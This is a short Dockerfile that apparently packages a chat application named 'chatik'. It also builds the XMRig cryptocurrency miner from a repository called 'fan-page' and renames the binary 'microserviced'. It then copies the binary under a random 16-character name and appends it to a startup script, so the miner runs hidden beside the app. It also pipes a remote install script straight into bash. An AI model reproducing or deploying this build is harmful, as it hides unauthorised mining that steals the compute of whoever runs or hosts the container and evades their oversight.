FROM ubuntu:18.04
RUN apt-get update && \
    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \
    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \
    apt-get install -y nodejs && \
    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \
    git clone https://github.com/cryptocheck/fan-page.git && \
    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \
    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page
RUN apt-get clean && apt-get purge -y git curl build-essential cmake
WORKDIR chatik
RUN export NAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1) && \
   cp microserviced $NAME && echo "\n ./${NAME}" >> electrode.sh
CMD npm start
